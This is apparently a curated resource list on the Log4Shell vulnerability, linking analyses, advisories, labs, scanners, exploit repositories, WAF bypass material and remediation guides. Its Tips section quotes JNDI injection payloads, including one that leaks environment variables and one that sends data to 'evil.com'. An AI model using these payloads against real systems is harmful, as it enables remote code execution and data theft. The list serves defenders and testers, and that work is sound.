# Table of Contents
- [TL;DR](#tldr)
- [Technical analysis](#technical-analysis)
- [Advisories](#advisories)
- [Tutorials](#tutorials)
- [Videos](#videos)
- [Intentionally vulnerable apps](#intentionally-vulnerable-apps)
- [Tools & Exploits](#tools--exploits)
  - [DNS loggers](#dns-loggers)
- [Methodology](#methodology)
- [Tips](#tips)
- [WAF bypass](#waf-bypass)
- [Awesome lists](#awesome-lists)
- [Remediation](#remediation)
- [Some vulnerable apps/vendors](#some-vulnerable-appsvendors)
- [Memes](#memes)
- [TODO](#todo)

# TL;DR

Term | Description
---|---
**Log4j** | The vulnerable Java Library
**JndiLookup** | The vulnerable part of Log4j
**Log4Shell** | The exploit developped to attack this vulnerability

[Source: CVE-2021-44228 Log4j (and Log4Shell) Executive Explainer by cje@bugcrowd](https://www.slideshare.net/caseyjohnellis/cve202144228-log4j-and-log4shell-executive-explainer-by-cjebugcrowd) (modified to add the second CVE)

CVE | Vulnerability type | Affected Log4j versions | Exploitable in default config
---|---|---|---
**CVE-2021-44228**	| RCE | 2.0 through 2.14.1 | Yes
**CVE-2021-45046** | Denial of Service (DoS) and RCE | 2.0 through 2.15.0	| No
**CVE-2021-4104**	| RCE | 1.2* | No
**CVE-2021-45105** | Denial of Service (DoS) | 2.0-beta9 to 2.16.0 | No

* CVE-2021-4104 will not be patched, as the Log4j 1.x branch has reached end-of-life

[Source: Tenable blog](https://www.tenable.com/blog/cve-2021-44228-cve-2021-45046-cve-2021-4104-frequently-asked-questions-about-log4shell)

![Log4Shell-timeline](https://user-images.githubusercontent.com/35920302/146178407-14f764fa-a2f9-4024-9265-0aeaa1a03599.png)

[Source: cutekernel.github.io](https://cutekernel.github.io/technical-illustrations/cves-2021.html)

![log4j_attack](https://user-images.githubusercontent.com/35920302/146178704-84116a6f-1016-43c4-b1f3-0552dfa0fb03.png)

[Source: govcert.ch](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)

![log4shell png](https://user-images.githubusercontent.com/35920302/146170447-915c1f09-8b34-4390-8f1b-95f9cf892c7a.jpeg)

[Source: musana.net](https://musana.net/2021/12/13/log4shell-Quick-Guide/)

![LOG4j-flyer](https://user-images.githubusercontent.com/35920302/146976304-7c7e48b1-75c6-431e-bc77-408928c8ece9.png)
[Source: Security Zines](https://securityzines.com/flyers/log4j.html)

# Technical analysis
- [Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Log4j Analysis: More JNDI Injection](https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/)
- [Rapid7 analysis](https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis): Includes PoCs for Apache Struts2, VMWare VCenter, Apache James, Apache Solr, Apache Druid, Apache JSPWiki and Apache OFBiz
- [Exploitation of Log4j CVE-2021-44228 before public disclosure and evolution of evasion and exfiltration](https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/)
- [CVE-2021-45105: Denial Of Service Via Uncontrolled Recursion In Log4j Strsubstitutor](https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor)
- [Log4j Vulnerability CVE-2021-45105: What You Need to Know](https://www.whitesourcesoftware.com/resources/blog/log4j-vulnerability-cve-2021-45105/)
- [Inside the code: How the Log4Shell exploit works](https://news.sophos.com/en-us/2021/12/17/inside-the-code-how-the-log4shell-exploit-works/) & [Log4Shell Hell: anatomy of an exploit outbreak](https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/)
- [Log4Shell Update: Severity Upgraded 3.7 -> 9.0 for Second log4j Vulnerability (CVE-2021-45046)](https://www.lunasec.io/docs/blog/log4j-zero-day-severity-of-cve-2021-45046-increased/)
- [The Subsequent Waves of log4j Vulnerabilities Aren’t as Bad as People Think](https://danielmiessler.com/blog/the-second-wave-of-log4j-vulnerabilities-werent-nearly-as-bad-as-people-think/)

# Advisories
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [CVE-2021-44228 on NIST](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

# Tutorials
- [A Detailed Guide on Log4J Penetration Testing](https://www.hackingarticles.in/a-detailed-guide-on-log4j-penetration-testing/)
- [log4shell - Quick Guide](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
- [Log4Shell — Simple Technical Explanation of the Exploit](https://inonst.medium.com/log4shell-simple-techincal-explanation-of-the-exploit-a5a3dd1918ec)

# Videos
- [Log4j RCE vulnerability explained with bypass for the initial fix (CVE-2021-44228, CVE-2021-45046)](https://www.youtube.com/watch?v=OS5lY3-M6tw)
- [Hackers vs. Developers // CVE-2021-44228 Log4Shell](https://www.youtube.com/watch?v=w2F67LbEtnk)
- [What do you need to know about the log4j (Log4Shell) vulnerability?](https://www.youtube.com/watch?v=oC2PZB5D3Ys) (Great breakdown of the vulnerability in the first 15 min)
- [Short demo by @MalwareTechBlog](https://www.youtube.com/watch?v=0-abhd-CLwQ)
- [CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)](https://www.youtube.com/watch?v=7qoPDq41xhQ)
- [Log4Shell, The Worst Java Vulnerability in Years](https://www.youtube.com/watch?v=m_AkCbFc8DM)

# Intentionally vulnerable apps
- [Solar, exploiting log4j (TryHackMe room by @_JohnHammond)](https://tryhackme.com/room/solar) & [Video walkthrough by CryptoCat](https://www.youtube.com/watch?v=PGJVLjgC2e4)
- [PentesterLab Log4j RCE](https://pentesterlab.com/exercises/log4j_rce/course) & [Log4j RCE II](https://pentesterlab.com/exercises/log4j_rce_ii/course)
- [BugHuntr.io scenario](https://twitter.com/BugHuntrIo/status/1469298538593067012)
- [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)
- [leonjza/log4jpwn](https://github.com/leonjza/log4jpwn)
- [kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)
- [Cyb3rWard0g/log4jshell-lab](https://github.com/Cyb3rWard0g/log4jshell-lab)

# Tools & Exploits
- [Log4Shell Everywhere](https://portswigger.net/bappstore/186be35f6e0d418eb1f6ecf1cc66a74d)
- [Ch0pin/log4JFrida](https://github.com/Ch0pin/log4JFrida)
- [dwisiswant0/look4jar](https://github.com/dwisiswant0/look4jar)
- [yahoo/check-log4j](https://github.com/yahoo/check-log4j)
- [jfrog/log4j-tools](https://github.com/jfrog/log4j-tools)
- [tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)
- [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)
- [Thinkst Canary](https://twitter.com/thinkstcanary/status/1469439743905697797)
- [Huntress Log4Shell Tester](https://log4shell.huntress.com)
- [log4shell.nse](https://github.com/righel/log4shell_nse) (Nmap NSE script that injects a Huntress/CanaryTokens/custom log4shell payload in HTTP requests described by JSON templates)
- [@SilentSignalHU’s Log4Shell Scanner (Burp extension)](https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f)
- [ActiveScan++](https://twitter.com/albinowax/status/1469258291616403457)
- [fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan) & [How to combine it with Amass for higher coverage](https://twitter.com/jeff_foley/status/1470463924260777985)
- [Burp Bounty Pro Profile](https://twitter.com/BurpBounty/status/1469249786092085249)
- [whwlsfb/Log4j2Scan](https://github.com/whwlsfb/Log4j2Scan) (Passive Scanner plugin for Burp)
- [Semgrep rule](https://semgrep.dev/r?q=log4j-message-lookup-injection)
- [CodeQL query](https://github.com/cldrn/codeql-queries/blob/master/log4j-injection.ql)
- [Nuclei template](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)
- [Burp Intruder in Pitchfork mode](https://twitter.com/ITSecurityguard/status/1470187651844161536)
- [LogMePwn](https://github.com/0xInfection/LogMePwn)
- [LeakIX/l9fuzz](https://github.com/LeakIX/l9fuzz)
- [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)
- [OWASP ZAP](https://www.zaproxy.org/blog/2021-12-14-log4shell-detection-with-zap/)
- [adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
- [JNDI injector for burp pro](https://twitter.com/Kuggofficial/status/1470503381143859207)
- [alexandre-lavoie/python-log4rce](https://github.com/alexandre-lavoie/python-log4rce)

## DNS loggers
- [dns-exfil](https://github.com/KarimPwnz/dns-exfil)
- [canarytokens](https://canarytokens.org) (use Token Type: Log4Shell)
- [interactsh](https://app.interactsh.com)
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
- [requestbin](https://requestbin.net/)

# Methodology

![v2-detectLog4shell](https://user-images.githubusercontent.com/35920302/146975535-c87f8dfc-01cf-4ef3-b2fe-d07f4d14f8f9.png)
[Source: v2-detectLog4shell mindmap by @Dick_Reverse](https://github.com/DickReverse/InfosecMindmaps/blob/main/Log4shell/v2-detectLog4shell.png)

![AmIVulnerable-Log4shell-v6 1](https://user-images.githubusercontent.com/35920302/146975586-a942deb1-c52f-42ef-b06e-c79bf2e48938.png)
[Source: AmIVulnerable-Log4shell-v6.1 mindmap by @Dick_Reverse](https://github.com/DickReverse/InfosecMindmaps/blob/main/Log4shell/v2-detectLog4shell.png)

# Tips
- [The Log4J formatting is nestable which means payloads like `${jndi:ldap://${env:user}.xyz.collab.com/a}` will leak server side env vars](https://twitter.com/_StaticFlow_/status/1469358229767475205)
- [Tutorial on setting up RogueJDNI](https://twitter.com/ITSecurityguard/status/1469347404986077185)
- [Class path is useful information to have to know what gadgets should be available or where you need to look for some to get rce.](https://twitter.com/jstnkndy/status/1469752457618202624)
- [How to attack any JDK version for log4j "without" guessing classpath on server?](https://twitter.com/aaditya_purani/status/1470487281572237312)
- [Some events are only logged when an exception occur, so specially long payloads with unexpected characters may help you trigger those exceptions.](https://twitter.com/pwntester/status/1470435811812380675)
- [If you omit the closing brace `}` (so the payload would look like `${jndi:ldap://evil.com/`), you will potentially get a bunch of data exfiltrated to your server until the next `}` appears in that data](https://twitter.com/TomAnthonySEO/status/1470374984749133825)
- [Attack path works in *ANY* java version](https://twitter.com/marcioalm/status/1470361495405875200)
- [If you’re scanning for Log4Shell at scale, you can easily determine which host is pinging back by adding it to the start of your callback hostname](https://twitter.com/hakluke/status/1469875175839584257)
- [Examples of non-default vulnerable patterns](https://twitter.com/pwntester/status/1471511483422961669)

# WAF bypass
- [Puliczek/CVE-2021-44228-PoC-log4j-bypass-words](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words)
- [woodpecker-appstore/log4j-payload-generator](https://github.com/woodpecker-appstore/log4j-payload-generator)
- [Log4j Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)

## Bypass examples
- <https://twitter.com/wugeej/status/1469982901412728832>
- <https://twitter.com/BountyOverflow/status/1470001858873802754>
- <https://twitter.com/h4x0r_dz/status/1469663187079417857>
- <https://twitter.com/ymzkei5/status/1469765165348704256>
- <https://twitter.com/wireghoul/status/1469473975449255941>
- <https://twitter.com/Rezn0k/status/1469523006015750146>
- <https://twitter.com/Laughing_Mantis/status/1470526083271303172>

# Awesome lists
- [Reddit mega thread curated by NCC Group](https://www.reddit.com/r/blueteamsec/comments/rd38z9/log4j_0day_being_exploited/)
- [Awesome Log4Shell](https://github.com/snyk-labs/awesome-log4shell)
- [NCSC-NL/log4shell](https://github.com/NCSC-NL/log4shell)

# Remediation
- [Guide: How To Detect and Mitigate the Log4Shell Vulnerability (CVE-2021-44228)](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)

![Shield-Log4shell-v1](https://user-images.githubusercontent.com/35920302/146975230-436bef91-ad71-4bde-9b6c-3875c49274f5.png)
[Source: Shield-Log4shell-v1 mindmap by @Dick_Reverse](https://github.com/DickReverse/InfosecMindmaps/blob/main/Log4shell/Shield-Log4shell-v1.png)

# Some vulnerable apps/vendors
- [YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)
- [20211210-TLP-WHITE_LOG4J.md](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)
- [NCSC-NL/log4shell](https://github.com/NCSC-NL/log4shell/blob/main/software/README.md)
- [ZAP](https://www.zaproxy.org/blog/2021-12-10-zap-and-log4shell/)
- [Ingenuity, the Mars 2020 Helicopter mssion](https://twitter.com/TheASF/status/1400875147163279374)
- [VCenter](https://twitter.com/w3bd3vil/status/1469814463414951937)
- [Ghidra](https://twitter.com/zhuowei/status/1469186818549719042)
- [Apache JAMES SMTP server](https://twitter.com/dlitchfield/status/1469809966785564675)

# Memes
- [lo4jmemes.com](https://log4jmemes.com)
- [istheinternetonfire.com](https://istheinternetonfire.com)

# TODO
Add headers, payloads, data that can be exfiltrated, entry point examples & tools to receive OOB DNS requests.
